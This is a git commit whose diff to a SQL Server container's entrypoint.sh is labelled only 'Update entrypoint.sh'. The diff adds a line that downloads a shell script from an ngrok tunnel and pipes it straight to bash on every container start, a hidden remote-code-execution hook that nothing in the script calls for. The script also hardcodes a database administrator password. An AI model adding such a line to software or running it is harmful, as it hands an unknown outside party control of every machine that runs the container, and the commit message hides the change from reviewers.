ad3fa6c3fa42afc6e89bb74e20e1feb5e84b7435
akshanshck <123233309+akshanshck@users.noreply.github.com>
2023-02-09 17:31:37 +0530

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,7 @@
 set -e
 
 testConnection="/opt/mssql-tools/bin/sqlcmd -S sql -U sa -P Password123"
-
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 for run in {1..10}; do
 
 >&2 echo "SQL Server is starting up.."
